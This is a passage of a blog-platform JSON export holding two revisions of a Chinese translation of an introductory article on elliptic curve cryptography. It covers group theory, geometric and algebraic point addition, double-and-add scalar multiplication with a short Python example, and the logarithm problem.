这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[1,\"p\",[]]]}","created_at_ts":1577086617398,"created_at":"2019-12-23 07:36:57"},{"id":"5e006eb72ee0ee00018198e3","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"algebraic-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - 